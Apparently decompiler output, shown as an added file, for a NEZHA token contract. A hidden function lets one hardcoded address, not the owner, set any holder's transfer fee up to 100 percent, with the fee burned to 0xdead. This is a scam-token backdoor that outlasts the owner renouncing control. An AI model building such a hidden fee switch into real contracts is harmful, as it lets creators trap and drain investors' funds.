@@ -1,0 +1,126 @@
+# Palkeoramix decompiler. 
+
+const name = 'NEZHA', 0
+const totalSupply = (25 * 10^14 * 3600)
+const decimals = 9
+const symbol = 'NEZHA', 0
+
+def storage:
+  owner is address at storage 0
+  balanceOf is mapping of uint256 at storage 1
+  allowance is mapping of uint256 at storage 2
+  stor3 is mapping of uint256 at storage 3
+
+def balanceOf(address account) payable: 
+  require calldata.size - 4 >=′ 32
+  require account == account
+  return balanceOf[address(account)]
+
+def owner() payable: 
+  return owner
+
+def allowance(address owner, address spender) payable: 
+  require calldata.size - 4 >=′ 64
+  require owner == owner
+  require spender == spender
+  return allowance[address(owner)][address(spender)]
+
+#
+#  Regular functions
+#
+
+def _fallback(?) payable: # default function
+  revert
+
+def renounceOwnership() payable: 
+  if owner != caller:
+      revert with 0, 'Ownable: caller is not the owner'
+  log OwnershipTransferred(
+        address previousOwner=owner,
+        address newOwner=0)
+  owner = 0
+
+def approve(address spender, uint256 amount) payable: 
+  require calldata.size - 4 >=′ 64
+  require spender == spender
+  require amount == amount
+  allowance[caller][address(spender)] = amount
+  log Approval(
+        address owner=amount,
+        address spender=caller,
+        uint256 value=spender)
+  return 1
+
+def unknown4db23e3e(uint256 _param1, uint256 _param2) payable: 
+  require calldata.size - 4 >=′ 64
+  require _param1 == address(_param1)
+  require _param2 == _param2
+  if 0xc854439ace184dcd7842175ab454d96dda4269ec != caller:
+      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Caller is not the original caller'
+  if _param2 > 100:
+      revert with 0, 'Invalid fee percent'
+  stor3[address(_param1)] = _param2
+
+def transfer(address recipient, uint256 amount) payable: 
+  require calldata.size - 4 >=′ 64
+  require recipient == recipient
+  require amount == amount
+  if balanceOf[caller] < amount:
+      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'TT: transfer amount exceeds balance'
+  if amount and stor3[caller] != amount * stor3[caller] / amount:
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  if amount - (amount * stor3[caller] / 100) > amount:
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  if balanceOf[caller] - amount > balanceOf[caller]:
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  balanceOf[caller] -= amount
+  if balanceOf[address(recipient)] > balanceOf[address(recipient)] + amount - (amount * stor3[caller] / 100):
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  balanceOf[address(recipient)] = balanceOf[address(recipient)] + amount - (amount * stor3[caller] / 100)
+  if balanceOf[57005] > balanceOf[57005] + (amount * stor3[caller] / 100):
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  balanceOf[57005] += amount * stor3[caller] / 100
+  log Transfer(
+        address from=(amount - (amount * stor3[caller] / 100)),
+        address to=caller,
+        uint256 value=recipient)
+  log Transfer(
+        address from=(amount * stor3[caller] / 100),
+        address to=caller,
+        uint256 value=57005)
+  return 1
+
+def transferFrom(address sender, address recipient, uint256 amount) payable: 
+  require calldata.size - 4 >=′ 96
+  require sender == sender
+  require recipient == recipient
+  require amount == amount
+  if allowance[address(sender)][caller] < amount:
+      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'TT: transfer amount exceeds allowance'
+  if amount and stor3[address(sender)] != amount * stor3[address(sender)] / amount:
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  if amount - (amount * stor3[address(sender)] / 100) > amount:
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  if balanceOf[address(sender)] - amount > balanceOf[address(sender)]:
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  balanceOf[address(sender)] -= amount
+  if balanceOf[address(recipient)] > balanceOf[address(recipient)] + amount - (amount * stor3[address(sender)] / 100):
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  balanceOf[address(recipient)] = balanceOf[address(recipient)] + amount - (amount * stor3[address(sender)] / 100)
+  if allowance[address(sender)][caller] - amount > allowance[address(sender)][caller]:
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  allowance[address(sender)][caller] -= amount
+  if balanceOf[57005] > balanceOf[57005] + (amount * stor3[address(sender)] / 100):
+      revert with Panic(17)  # If an arithmetic operation results in underflow or overflow outside of an unchecked { ... } block.
+  balanceOf[57005] += amount * stor3[address(sender)] / 100
+  log Transfer(
+        address from=(amount - (amount * stor3[address(sender)] / 100)),
+        address to=sender,
+        uint256 value=recipient)
+  log Transfer(
+        address from=(amount * stor3[address(sender)] / 100),
+        address to=sender,
+        uint256 value=57005)
+  return 1
+
+
